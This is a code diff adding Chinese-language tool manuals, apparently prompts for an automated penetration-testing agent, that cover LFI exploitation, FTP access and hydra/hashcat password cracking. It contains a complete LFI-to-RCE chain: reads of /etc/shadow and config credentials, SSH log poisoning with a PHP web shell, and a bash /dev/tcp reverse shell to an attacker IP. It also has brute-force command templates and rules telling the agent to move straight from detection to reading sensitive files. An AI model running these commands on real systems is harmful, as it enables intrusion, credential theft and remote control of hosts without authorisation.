@@ -336,6 +336,86 @@ LFI（本地文件包含）测试：
             "schema": {"users": ["string"], "shares": ["string"]},
         },
     },
+    "lfi_rce": {
+        "description": "LFI本地文件包含与RCE远程命令执行利用",
+        "manual": """
+⚠️ LFI→RCE 完整利用链 ⚠️
+
+════════════════════════════════════════════════
+步骤1 - 确认LFI漏洞：
+════════════════════════════════════════════════
+发现包含参数的PHP文件时（如 ?file= ?page= ?image= ?path= ?include=）：
+  curl "http://<target>/page.php?file=/etc/passwd"
+  curl "http://<target>/page.php?file=../../../../etc/passwd"
+
+如果能读取到 passwd 内容，LFI确认。
+
+════════════════════════════════════════════════
+步骤2 - PHP Filter读源码（base64编码）：
+════════════════════════════════════════════════
+  curl "http://<target>/page.php?file=php://filter/convert.base64-encode/resource=page.php"
+  → 返回base64编码的PHP源码，用 base64 -d 解码
+
+════════════════════════════════════════════════
+步骤3 - 读取敏感文件（按优先级）：
+════════════════════════════════════════════════
+  /etc/passwd                          → 确认用户名
+  /etc/shadow                          → 密码哈希（需root）
+  /etc/nginx/.htpasswd                 → nginx认证密码
+  /etc/nginx/sites-enabled/default     → nginx虚拟主机配置
+  /etc/nginx/nginx.conf                → nginx全局配置
+  /var/www/html/config.php             → 数据库凭据
+  /var/www/html/wp-config.php          → WordPress数据库凭据
+  /proc/self/environ                   → 环境变量（可能包含路径）
+  /var/log/auth.log                    → SSH认证日志（用于日志投毒）
+
+════════════════════════════════════════════════
+步骤4 - SSH日志投毒（最关键！）：
+════════════════════════════════════════════════
+当目标开放SSH端口时，向auth.log注入PHP代码：
+  ssh '<?php system($_GET["cmd"]); ?>'@<target> -p <ssh_port>
+  → 这会在 /var/log/auth.log 中写入PHP代码
+
+然后通过LFI包含日志文件执行命令：
+  curl "http://<target>/vuln.php?file=/var/log/auth.log&cmd=id"
+  curl "http://<target>/vuln.php?file=/var/log/auth.log&cmd=whoami"
+  curl "http://<target>/vuln.php?file=/var/log/auth.log&cmd=ls+-la+/"
+
+════════════════════════════════════════════════
+步骤5 - 反弹Shell：
+════════════════════════════════════════════════
+在攻击机上监听：nc -lvnp 4444
+通过LFI+日志投毒执行反弹shell（URL编码）：
+  curl "http://<target>/vuln.php?file=/var/log/auth.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<attacker_ip>/4444+0>%261'"
+
+════════════════════════════════════════════════
+步骤6 - 其他LFI→RCE方法（如果SSH日志投毒不可用）：
+════════════════════════════════════════════════
+PHP Session包含：
+  curl "http://<target>/vuln.php?file=/var/lib/php/sessions/sess_<session_id>"
+
+Apache日志包含：
+  curl "http://<target>/vuln.php?file=/var/log/apache2/access.log"
+
+/proc/self/environ包含：
+  curl -H "User-Agent: <?php system($_GET['cmd']); ?>" "http://<target>/vuln.php?file=/proc/self/environ&cmd=id"
+
+════════════════════════════════════════════════
+绝对禁止：
+════════════════════════════════════════════════
+❌ 发现LFI后不要停留在探测阶段 — 立即读取敏感文件
+❌ 不要只测试不同参数名（?file= ?page=）— 看 HTML 源码确认参数名
+❌ 如果php://filter返回空，尝试不同路径格式
+""",
+        "return_format": {
+            "type": "json",
+            "schema": {
+                "vulnerability": "string",
+                "file_read": "string",
+                "rce": "string",
+            },
+        },
+    },
     "rpcclient": {
         "description": "RPC 服务枚举工具",
         "manual": """
@@ -452,6 +532,50 @@ LFI（本地文件包含）测试：
 """,
         "return_format": {"type": "json", "schema": {"results": ["string"]}},
     },
+    "ftp": {
+        "description": "FTP文件传输协议工具",
+        "manual": """
+⚠️ FTP 渗透测试规则 ⚠️
+
+════════════════════════════════════════════════
+分阶段测试：
+════════════════════════════════════════════════
+阶段1 - 匿名登录测试：
+  ftp <target>
+  用户名: anonymous
+  密码: anonymous（或空）
+  登录后：ls, cd, get <文件>
+
+阶段2 - 列出FTP目录内容：
+  使用 curl 列出目录：
+  curl -s ftp://<target>/
+  curl -s ftp://anonymous:anonymous@<target>/
+
+阶段3 - 下载可疑文件：
+  curl -s ftp://anonymous:anonymous@<target>/<文件> -o /tmp/<文件>
+  wget ftp://anonymous:anonymous@<target>/<文件> -O /tmp/<文件>
+
+阶段4 - 凭据爆破（仅在匿名登录失败时）：
+  hydra -l admin -P /usr/share/wordlists/fasttrack.txt <target> ftp
+  hydra -l <从页面获取的用户名> -P /usr/share/wordlists/fasttrack.txt <target> ftp
+
+════════════════════════════════════════════════
+绝对禁止：
+════════════════════════════════════════════════
+❌ 禁止使用 heredoc（<<EOF）— 会导致超时卡死
+❌ 禁止使用交互式FTP（用curl代替）
+❌ 禁止使用 rockyou.txt 爆破FTP密码
+❌ 禁止使用 ftp -n 方式 then user/password 命令（容易出错）
+❌ 如果匿名登录成功，优先下载文件分析，不要爆破
+""",
+        "return_format": {
+            "type": "json",
+            "schema": {
+                "files": ["string"],
+                "credentials": [{"user": "string", "password": "string"}],
+            },
+        },
+    },
     "burpsuite": {
         "description": "Web 请求拦截与重放工具（导出请求分析）",
         "manual": """
@@ -520,44 +644,47 @@ LFI（本地文件包含）测试：
     "hydra": {
         "description": "多协议口令爆破工具",
         "manual": """
-⚠️ hydra 使用规则（必须严格遵守）⚠️
+⚠️⚠️⚠️ hydra 绝对规则 ⚠️⚠️⚠️
+
+⛔⛔⛔ 禁止使用的字典（会导致超时卡死）：
+⛔ rockyou.txt - 1400万条，会超时卡死
+⛔ dirb/big.txt - 用作用户名或密码字典，会超时
+⛔ metasploit/unix_users.txt - 用作用户名列表，会超时
+⛔ 任何超过2000条的字典作为第一步
 
 ════════════════════════════════════════════════
-分阶段爆破策略：
+唯一允许的命令模板（直接复制使用）：
 ════════════════════════════════════════════════
-阶段1 - 快速弱口令尝试（几秒~1分钟）：
-  hydra -l admin -P /usr/share/wordlists/fasttrack.txt -s <port> <target> <service>
-  → 必须先用小字典！绝大多数弱口令都能在这里找到
-
-阶段2 - 中等字典（1~3分钟）：
-  hydra -l admin -P /usr/share/wordlists/best1050.txt -s <port> <target> <service>
-  → 仅在阶段1失败时使用
-
-════════════════════════════════════════════════
-常用命令模板（直接使用）：
-════════════════════════════════════════════════
-HTTP基础认证爆破：
+HTTP基础认证爆破（端口8888等）：
   hydra -l admin -P /usr/share/wordlists/fasttrack.txt <target> http-get / -s <port>
+  hydra -l tomato -P /usr/share/wordlists/fasttrack.txt <target> http-get / -s <port>
+
 SSH爆破：
-  hydra -l root -P /usr/share/wordlists/fasttrack.txt <target> ssh
+  hydra -l root -P /usr/share/wordlists/fasttrack.txt <target> ssh -p <port>
+  hydra -l tomato -P /usr/share/wordlists/fasttrack.txt <target> ssh -p <port>
+
 FTP爆破：
   hydra -l admin -P /usr/share/wordlists/fasttrack.txt <target> ftp
-多用户名尝试：
-  hydra -L /usr/share/wordlists/fasttrack.txt -P /usr/share/wordlists/fasttrack.txt <target> <service> -s <port>
+
+如果第一阶段失败，第二阶段：
+  hydra -l admin -P /usr/share/wordlists/best1050.txt <target> http-get / -s <port>
+
+════════════════════════════════════════════════
+利用目标主题生成定制字典：
+════════════════════════════════════════════════
+如果目标名称是Tomato，生成定制字典：
+  echo -e "tomato\\npotato\\nketchup\\ntomatoes\\nPotato\\nTomato" > /tmp/target_words.txt
+  hydra -l admin -P /tmp/target_words.txt <target> http-get / -s <port>
+  hydra -l tomato -P /tmp/target_words.txt <target> http-get / -s <port>
 
 ════════════════════════════════════════════════
 绝对禁止：
 ════════════════════════════════════════════════
-❌ 禁止使用 rockyou.txt（1400万条，HTTP认证需数天才能跑完）
-❌ 禁止不指定并发数限制（必须加 -t 4 或 -t 10）
-❌ 禁止长时间爆破（超过5分钟应中断换策略）
-
-════════════════════════════════════════════════
-推荐字典：
-════════════════════════════════════════════════
-  fasttrack.txt    - 极小（几百条，几秒完成）← 始终先用这个
-  best1050.txt     - 小（1050条，1~3分钟）← fasttrack失败后用
-  ⛔ rockyou.txt   - 禁止使用（1400万条，会卡死）
+❌ 禁止使用 rockyou.txt（会超时卡死）
+❌ 禁止使用 big.txt / unix_users.txt（会超时）
+❌ 禁止用 & 后台运行多条hydra（会卡死整个流程）
+❌ 禁止不指定端口 -s <port>（HTTP非标准端口必须指定）
+❌ 禁止超时后继续尝试更大的字典（应该换策略）
 """,
         "return_format": {
             "type": "json",
@@ -636,8 +763,18 @@ Apache APR1-MD5 示例（.htpasswd常见格式）：
 ════════════════════════════════════════════════
 绝对禁止：
 ════════════════════════════════════════════════
-❌ 禁止使用 rockyou.txt 作为第一步
+❌ 禁止使用 rockyou.txt（会超时卡死）
 ❌ 禁止不指定 -m 参数（必须指定hash类型）
+❌ 禁止超时后继续用更大的字典（应该换策略）
+
+利用目标主题生成定制字典：
+如果目标名称是Tomato，生成定制字典：
+  echo -e "tomato\\npotato\\nketchup\\nTomato\\nPotato" > /tmp/target_words.txt
+  hashcat -m 1600 /tmp/hash.txt /tmp/target_words.txt
+
+同时用目标相关词+fasttrack组合：
+  cat /usr/share/wordlists/fasttrack.txt /tmp/target_words.txt | sort -u > /tmp/combined.txt
+  hashcat -m 1600 /tmp/hash.txt /tmp/combined.txt
 """,
         "return_format": {
             "type": "json",
